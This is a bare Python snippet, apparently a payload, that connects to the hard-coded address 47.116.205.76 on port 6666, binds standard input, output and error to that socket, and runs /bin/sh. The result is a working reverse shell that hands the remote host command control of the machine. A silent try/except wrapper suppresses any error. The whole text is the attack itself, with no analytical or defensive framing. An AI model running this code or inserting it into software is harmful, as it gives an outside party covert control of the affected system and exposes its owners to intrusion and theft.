try:
    import socket, subprocess, os
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("47.116.205.76", 6666))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.execve('/bin/sh', ['/bin/sh'], {})
except:
    pass
